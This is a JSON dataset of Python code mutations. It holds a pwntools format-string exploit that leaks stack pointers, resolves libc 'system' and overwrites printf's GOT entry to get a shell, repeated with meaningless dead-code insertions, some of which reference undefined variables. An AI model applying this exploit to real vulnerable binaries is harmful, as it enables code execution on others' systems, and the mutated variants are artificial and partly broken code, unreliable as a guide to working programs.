[
    {
        "func_name": "executer",
        "original": "def executer(fmt):\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r",
        "mutated": [
            "def executer(fmt):\n    if False:\n        i = 10\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r",
            "def executer(fmt):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r",
            "def executer(fmt):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r",
            "def executer(fmt):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r",
            "def executer(fmt):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    p.sendline(fmt)\n    p.stdin.flush()\n    r = p.recvuntil(b'again=\\n')\n    return r"
        ]
    },
    {
        "func_name": "exploit",
        "original": "def exploit(e):\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()",
        "mutated": [
            "def exploit(e):\n    if False:\n        i = 10\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()",
            "def exploit(e):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()",
            "def exploit(e):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()",
            "def exploit(e):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()",
            "def exploit(e):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    p = e.process()\n\n    def executer(fmt):\n        p.sendline(fmt)\n        p.stdin.flush()\n        r = p.recvuntil(b'again=\\n')\n        return r\n    f = FmtStr(executer)\n    addrbits = min(context.bits, 48)\n    min_code_ptr = 16 << addrbits - 8\n    max_code_ptr = 126 << addrbits - 8\n    for off in range(64):\n        random_code_ptr = f.leak_stack(off)\n        packed = bytearray(pack(random_code_ptr))\n        chars = set(packed) - {0}\n        if min_code_ptr < random_code_ptr < max_code_ptr and max(chars) > 128 and (min(chars) < 128) and (not hex(random_code_ptr).startswith('0x7ff')):\n            break\n    log.info('Code ptr: %#x' % random_code_ptr)\n    online_elf = DynELF(f.leaker, pointer=random_code_ptr, elf=e, libcdb=False)\n    print('Stack: %#x' % (online_elf.stack(),))\n    print('Heap: %#x' % (online_elf.heap(),))\n    info('Finding base address of the executable')\n    for ref in e.sym:\n        if not ref:\n            continue\n        ref_addr = online_elf.lookup(ref)\n        if ref_addr:\n            print('%s: %r' % (ref, ref_addr))\n            break\n    system = online_elf.lookup('system', 'libc')\n    print('system: %#x' % system)\n    e.address += ref_addr - e.sym[ref]\n    f.write(e.sym.got.printf, system)\n    f.execute_writes()\n    p.sendline(b'echo ::$(( 16 * 16 ))')\n    p.recvuntil(b'::')\n    line = p.recvline()\n    assert line == b'256\\n'\n    p.sendline(b'exit')\n    p.close()"
        ]
    }
]